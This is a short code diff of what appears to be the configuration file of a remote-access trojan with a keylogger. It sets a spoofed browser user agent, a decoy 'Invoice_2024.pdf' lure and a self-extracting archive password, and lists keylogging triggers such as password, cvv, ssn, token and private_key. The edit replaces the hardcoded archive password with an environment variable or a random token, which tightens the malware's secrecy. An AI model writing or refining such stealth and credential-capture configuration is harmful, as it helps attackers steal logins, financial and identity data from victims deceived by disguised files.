@@ -47,13 +47,19 @@ RAT_FEATURES = [
 # === Stealth Configuration ===
 USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
 DECOY_DOC = "Invoice_2024.pdf"
-SFX_PASSWORD = "CyberRecon2024"
+
+# SFX password — must be set via env var. NEVER hardcode.
+# Generate with: python -c "import secrets; print(secrets.token_urlsafe(24))"
+SFX_PASSWORD = os.getenv("CYBERRECON_SFX_PASSWORD", "")
+if not SFX_PASSWORD:
+    import secrets as _secrets
+    SFX_PASSWORD = _secrets.token_urlsafe(24)
 
 # === Keylogger Configuration ===
 KEYLOG_BUFFER_SIZE = 500
 KEYLOG_FLUSH_INTERVAL = 30   # seconds
 KEYLOG_SENSITIVE_WORDS = [
-    "password", "credit", "cvv", "ssn", "login", 
+    "password", "credit", "cvv", "ssn", "login",
     "admin", "secret", "token", "api_key", "private_key"
 ]
 
